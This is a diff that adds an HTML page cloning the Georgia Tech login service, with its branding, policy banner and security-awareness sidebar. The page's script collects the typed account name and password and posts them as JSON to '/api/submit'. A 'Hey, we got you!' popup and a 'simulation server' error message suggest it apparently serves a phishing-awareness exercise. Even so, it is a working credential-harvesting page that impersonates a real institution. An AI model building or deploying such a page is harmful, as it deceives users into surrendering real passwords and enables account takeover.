@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+<link rel="stylesheet" href="/styles.css">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Georgia Institute of Technology</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<header class="site-header">
+  <a class="brand" href="#" onclick="return false;"><img src="/gt-logo-oneline-white.png" alt="Georgia Tech"></a>
+  <h1>Georgia Tech Login Service <small>(7)</small></h1>
+</header>
+
+<main class="layout">
+<section class="login-card">
+<h2>Enter your GT Account and Password</h2>
+<form id="loginForm">
+<label for="account">GT Account:</label>
+<input id="account" autocomplete="off" placeholder="Enter account" required>
+<label for="password">Password:</label>
+<input id="password" type="password" autocomplete="off" placeholder="Enter password" required>
+<div class="buttons">
+<button type="submit" id="login">LOGIN</button>
+<div id="popup" class="popup">
+    <div class="popup-content">
+        <p>Hey, we got you!</p>
+        <button type="button" id="closePopup">Close</button>
+    </div>
+</div>
+
+<button type="button" id="help">Get Help</button>
+</div>
+</form>
+<p class="legal">This computer system is the property of the Georgia Institute of Technology. Use of this system requires compliance with all Institute and Board of Regents policies, including the <a href="https://policylibrary.gatech.edu/information-technology/" target="_blank">Acceptable Use Policy, Cyber Security Policy and Data Privacy Policy</a>. Users should have no expectation of privacy; all activity and data may be monitored, recorded, inspected, or disclosed to authorized personnel to meet Institute obligations. By using this system, you acknowledge and consent to these terms.</p>
+</section>
+
+<aside class="security-wrap">
+<div class="security-card">
+<h2>SECURITY AWARENESS</h2>
+<h3>Duo codes are strictly confidential</h3>
+<ul>
+<li>Never share a Duo code with anyone via phone, email, text, or chat.</li>
+<li>Never use a Duo code you receive from anyone.</li>
+<li>Georgia Tech IT team will never ask you for your Duo code.</li>
+<li>Deny any Duo Push that you did not initiate by tapping “I'm not logging in” and “Yes” for suspicious login. Then follow the <a href="https://iam.gatech.edu/help/phishing-recovery/" target="_blank">Phishing Recovery</a>process.</li>
+</ul>
+<h3>Recent Phishing Email Subjects identified in Cyberattacks at Georgia Tech [see <a href="https://gophishing.security.gatech.edu/" target="_blank">GT Phishbowl</a>]</h3>
+<ul>
+<li>Short Term Research Internship Opportunity</li>
+<li>Remote Administrative Support Assistant | Part-Time Opportunity</li>
+<li>Exciting Part-Time Administrative Assistant Opportunity! | Action Required: Email Account Confirmation</li>
+<li>Georgia Tech – Account Verification Notice</li>
+<li>Flexible Remote Opportunity – Earn Up to $550/Week</li>
+</ul>
+</div>
+</aside>
+</main>
+
+<footer>
+<div class="footer-inner">
+<div class="copyright">© 2021 Georgia Institute of Technology</div>
+<nav aria-label="Footer navigation">
+<a href="#" onclick="return false;">Emergency Information</a>
+<a href="#" onclick="return false;">Legal &amp; Privacy Information</a>
+<a href="#" onclick="return false;">Accessibility</a>
+<a href="#" onclick="return false;">Accountability</a>
+<a href="#" onclick="return false;">Accreditation</a>
+<a href="#" onclick="return false;">Employment</a>
+</nav>
+</div>
+</footer>
+
+<script>
+    const clickdemo = document.getElementById("login");
+    const popup = document.getElementById("popup");
+    const closePopup = document.getElementById("closePopup");
+
+    clickdemo.addEventListener("click", function () {
+        popup.style.display = "flex";
+    });
+
+    closePopup.addEventListener("click", function () {
+        popup.style.display = "none";
+    });
+
+    const form = document.getElementById("loginForm");
+    const status = document.getElementById("status");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const account = document.getElementById("account").value;
+      const password = document.getElementById("password").value;
+
+      try {
+        const response = await fetch("/api/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ account, password })
+        });
+
+        const result = await response.json();
+        status.textContent = result.message;
+
+        if (response.ok) {
+          form.reset();
+        }
+      } catch (error) {
+        status.textContent = "Unable to contact the simulation server.";
+      }
+    });
+</script>
+
+</body>
+</html>
